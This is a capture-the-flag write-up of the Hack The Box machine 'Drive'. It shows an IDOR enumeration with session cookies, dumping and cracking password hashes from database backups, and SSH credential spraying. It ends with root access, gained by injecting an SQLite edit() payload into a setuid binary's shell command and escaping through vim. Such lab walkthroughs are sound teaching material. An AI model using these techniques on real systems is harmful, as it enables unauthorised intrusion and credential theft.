---
title: "Drive"
tags:
    - machine
    - idor
    - sqli
date: "2024-02-20"
thumbnail: "/assets/img/thumbnail/Drive.png"
bookmark: true
---


# Description
---

<img src="/assets/img/thumbnail/Drive.png" alt="drive">

# Solution
---
## Recon
---

Applying nmap scan

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/drive]
└─$ nmap -sV -sC -Pn -oA nmap/drive 10.10.11.235
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-20 02:36 SAST
Nmap scan report for 10.10.11.235
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://drive.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.61 seconds
```


## shell as martin
---

from the scan results we see that port 80 is the most interesting as 3000 is filtered
we add this the record `10.10.11.235    drive.htb` to `/etc/hosts` file and go to the site
<img src="/assets/img/htb/drive/Capture.JPG" alt="home page">
I registered in the site and then logged in with my new account
I got redirected to this
<img src="/assets/img/htb/drive/Capture1.JPG" alt="home page">
I see two interesting tabs **upload file** & **dashboard**
**upload file**: enables me to upload file
I tried to upload shell but i got a response indicating that a malicious behaviour detected
Then i uploaded just a test file called tst with random text inside
**dashboard**: contains the uploaded files as shown below
<img src="/assets/img/htb/drive/Capture2.JPG" alt="dashboard">
When i open as example `Welcome_To_Doodle_Grive!` file, i reach this url `http://drive.htb/100/getFileDetail/`
and when i select other file like `tst`, i reach this url `http://drive.htb/112/getFileDetail/`
Ummmmmmm, there may be idor here but let's check this **reserve** option first.
It moves me to the url `http://drive.htb/112/block/`
<img src="/assets/img/htb/drive/Capture3.JPG" alt="block">

Let's try some enum for the idor

```bash
┌──(youssif㉿youssif)-[~]
└─$ ffuf -u http://drive.htb/FUZZ/getFileDetail/ -w <(seq 1 2000) -fc 500  -H "Cookie: csrftoken=wltcvo5fkh1kgl0kgyrMIS64hV0sjQ1d; sessionid=teshdlvcaeur5ogjpgkr2557tjahr041"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://drive.htb/FUZZ/getFileDetail/
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Cookie: csrftoken=wltcvo5fkh1kgl0kgyrMIS64hV0sjQ1d; sessionid=teshdlvcaeur5ogjpgkr2557tjahr041
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

[Status: 401, Size: 26, Words: 2, Lines: 1, Duration: 315ms]
    * FUZZ: 79

[Status: 401, Size: 26, Words: 2, Lines: 1, Duration: 261ms]
    * FUZZ: 98

[Status: 401, Size: 26, Words: 2, Lines: 1, Duration: 279ms]
    * FUZZ: 99

[Status: 401, Size: 26, Words: 2, Lines: 1, Duration: 266ms]
    * FUZZ: 101

[Status: 200, Size: 5081, Words: 1147, Lines: 172, Duration: 267ms]
    * FUZZ: 100

[Status: 200, Size: 5054, Words: 1059, Lines: 167, Duration: 276ms]
    * FUZZ: 112

:: Progress: [2000/2000] :: Job [1/1] :: 65 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

We got the interesting ids, We can access 100,112 in `getFileDetail` endpoint but when we try to access the others we get 401 status code in response
After some trails i found that we can access them through `block` endpoint like this `http://drive.htb/79/block/` and i found this
<img src="/assets/img/htb/drive/Capture4.JPG" alt="block">

Let's login using these credentials `ssh martin@10.10.11.235` and congratzzz we got a shell as martin

## shell as tom
---

I started digging into the machine as martin by searching for simple privesc ways like sudo -l, crontab, etc but with no useful information.
After some digging into the machine i found the accessable path with useful information in `/var/www/backups`

```bash
martin@drive:/var/www/backups$ ls
1_Dec_db_backup.sqlite3.7z  1_Nov_db_backup.sqlite3.7z  1_Oct_db_backup.sqlite3.7z  1_Sep_db_backup.sqlite3.7z  db.sqlite3
```

The 7z files needs password to be accessed but there's db.sqlite3 can be accessed by `sqlite3 db.sqlite`
after digging in it i reached this

```bash
sqlite> select username,password from accounts_customuser;
jamesMason|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
martinCruz|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
tomHands|sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004
crisDisel|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
admin|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
```

after cracking them offline using hashcat i got this creds `tomHands:sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316`
Couldn't use it to get shell as another user but let's keep it now

When we dig into network especially using `netstat -nltp` we will find this

```bash
martin@drive:/var/www/backups$ netstat -nltp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                  
```
We will use port forwarding to be able to access it using the command `ssh -L 3001:127.0.0.1:3000 martin@10.10.11.235`
and when we access this url `127.0.0.1:3000` we reach **gitea**
<img src="/assets/img/htb/drive/Capture5.JPG" alt="gitea">
I tried this creds `tomHands:john316` but couldn't login successfully
then note that from the database there's username `martinCruz` who is martin and we already know his password, so i used this creds and logged in successfully to this repo
<img src="/assets/img/htb/drive/Capture6.JPG" alt="repo">
after examining the repo especially the commits i found interesting commit with message `added the new database backup feature`
<img src="/assets/img/htb/drive/Capture7.JPG" alt="commit">
This commit shows info about making the backups and we got the password to extract the archived backups
when i extract the backup in backups directory i get error as i have no permissions here, so i move the backups to `/dev/shm` which is a traditional shared memory and extracted them their using for example this command `7z e -p'H@ckThisP@ssW0rDIfY0uC@n:)' /dev/shm/1_Sep_db_backup.sqlite3.7z -o/dev/shm/Sep.db.sqlite3`

the backups are sqlite3 databases and after digging into them you will find the treasures here `select username,password from accounts_customuser;` and this because the instances have some changes in the passwords so we will take them and crack them offline as done before.

The user tomHands is the one whose password is changed between the backup instances and here are all hashes with there hash cracking output

```bash
tomHands:sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscool
tomHands:sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
tomHands:sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316
tomHands:sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93:john boy
```

from `/etc/passwd` we know that there's a user called `tom` and we are trying to get a shell as tom so let's try ssh using all these passwords

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/drive]
└─$ crackmapexec ssh 10.10.11.235 -u tom -p passwdTom
SSH         10.10.11.235    22     10.10.11.235     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.235    22     10.10.11.235     [-] tom:johniscool Authentication failed.
SSH         10.10.11.235    22     10.10.11.235     [+] tom:johnmayer7 
```

so we can ssh using `tom:johnmayer7`

```bash
tom@drive:~$ ls
doodleGrive-cli  README.txt  user.txt
tom@drive:~$ cat user.txt 
********************************
```

## shell as root
---

we found `doodleGrive-cli` which seems very interesting it requires credientials to be launched so i moved it to my machine and started analyzing it using **ghidra**

when ghidra finishes analysis i examined the main function which is shown below after variable renaming

```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char username [16];
  char password [56];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setenv("PATH","",1);
  setuid(0);
  setgid(0);
  puts(
      "[!]Caution this tool still in the development phase...please report any issue to the developm ent team[!]"
      );
  puts("Enter Username:");
  fgets(username,0x10,(FILE *)stdin);
  sanitize_string(username);
  printf("Enter password for ");
  printf(username,0x10);
  puts(":");
  fgets(password,400,(FILE *)stdin);
  sanitize_string(password);
  iVar1 = strcmp(username,"moriarty");
  if (iVar1 == 0) {
    iVar1 = strcmp(password,"findMeIfY0uC@nMr.Holmz!");
    if (iVar1 == 0) {
      puts("Welcome...!");
      main_menu();
      goto LAB_0040231e;
    }
  }
  puts("Invalid username or password.");
LAB_0040231e:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

from this function we found the username:password which is `moriarty:findMeIfY0uC@nMr.Holmz!`
There are also 2 other functions which are `sanitize_string` & `main_menu` Let's check them

**sanitize_string**

```c
void sanitize_string(char *param_1)

{
  bool bVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  int local_3c;
  int local_38;
  uint local_30;
  undefined8 local_29;
  undefined local_21;
  long local_20;

  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_3c = 0;
  local_29 = 0x5c7b2f7c20270a00;
  local_21 = 0x3b;
  local_38 = 0;
  do {
    sVar2 = strlen(param_1);
    if (sVar2 <= (ulong)(long)local_38) {
      param_1[local_3c] = '\0';
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    bVar1 = false;
    for (local_30 = 0; local_30 < 9; local_30 = local_30 + 1) {
      if (param_1[local_38] == *(char *)((long)&local_29 + (long)(int)local_30)) {
        bVar1 = true;
        break;
      }
    }
    if (!bVar1) {
      param_1[local_3c] = param_1[local_38];
      local_3c = local_3c + 1;
    }
    local_38 = local_38 + 1;
  } while( true );
}
```

This is `sanitize_string` function which accepts string and removes bad characters
these bad characters are represnted as `0x5c7b2f7c20270a00` & `0x3b` which are `\{/| '\n\00;`

**main_menu**

```c
void main_menu(void)

{
  long in_FS_OFFSET;
  char local_28 [24];
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  fflush((FILE *)stdin);
  do {
    putchar(10);
    puts("doodleGrive cli beta-2.2: ");
    puts("1. Show users list and info");
    puts("2. Show groups list");
    puts("3. Check server health and status");
    puts("4. Show server requests log (last 1000 request)");
    puts("5. activate user account");
    puts("6. Exit");
    printf("Select option: ");
    fgets(local_28,10,(FILE *)stdin);
    switch(local_28[0]) {
    case '1':
      show_users_list();
      break;
    case '2':
      show_groups_list();
      break;
    case '3':
      show_server_status();
      break;
    case '4':
      show_server_log();
      break;
    case '5':
      activate_user_account();
      break;
    case '6':
      puts("exiting...");
                    /* WARNING: Subroutine does not return */
      exit(0);
    default:
      puts("please Select a valid option...");
    }
  } while( true );
}
```

as we see there are different options and each option has its own function but after examining them I'm interested in `activate_user_account`
**activate_user_account**

```c
void activate_user_account(void)

{
  size_t sVar1;
  long in_FS_OFFSET;
  char username [48];
  char local_118 [264];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter username to activate account: ");
  fgets(username,0x28,(FILE *)stdin);
  sVar1 = strcspn(username,"\n");
  username[sVar1] = '\0';
  if (username[0] == '\0') {
    puts("Error: Username cannot be empty.");
  }
  else {
    sanitize_string(username);
    snprintf(local_118,0xfa,
             "/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"%s\";\'"
             ,username);
                 printf("Activating account for user \'%s\'...\n",username);
    system(local_118);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

I think it's interesting because it takes an input from us which is the username and this input is put within the query
The only obstacle is **sanitize_string** function applied on this username
after search <a href="https://sqlite.org/cli.html">here</a> i found that SQL functions that have potentially harmful side-effects, such as edit(), fts3_tokenizer(), load_extension(), readfile() and writefile().
After examining **edit()** i found that it can open an editor and from it we can run command as root
First we will open the cli using this command `VISUAL=/usr/bin/vim ./doodleGrive-cli` because in the documentation of edit() function you will see that the editor can be chosen by making it the value if VISUAL environment variable
To bypass the **sanitize_string** function the payload will be `"&edit(username)-- - `
and it gives us vim editor at which we can type `:!/bin/bash` as shown
<img src="/assets/img/htb/drive/Capture8.JPG" alt="vim">
and congratz you are root now
you can get the flag

```bash
root@drive:~# /usr/bin/id
uid=0(root) gid=0(root) groups=0(root),1003(tom)
root@drive:~# /usr/bin/cat /root/root.txt
********************************
```
